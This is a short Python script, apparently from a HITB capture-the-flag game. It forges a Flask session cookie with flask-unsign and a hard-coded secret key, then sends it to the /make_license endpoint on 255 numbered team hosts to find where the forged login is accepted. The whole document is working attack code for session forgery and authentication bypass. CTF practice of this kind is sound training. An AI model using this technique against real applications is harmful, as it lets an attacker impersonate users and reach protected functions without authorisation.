import requests,os

url = "https://godeeper.team#i.ctf.hitb.org/make_license"

enc_session = os.popen("flask-unsign --sign --cookie \"{'user': 'fesageag'}\" --secret 'xecwcmrnpmybvquf'").read().strip()

for i in range(255):
        try :
                req = requests.post(url.replace("#i",str(i)),cookies={"session":enc_session},data={"license_key":"aadawd"})
                if req.status_code == 200 :
                    print(i,enc_session)

        except Exception as e :
                print(e)

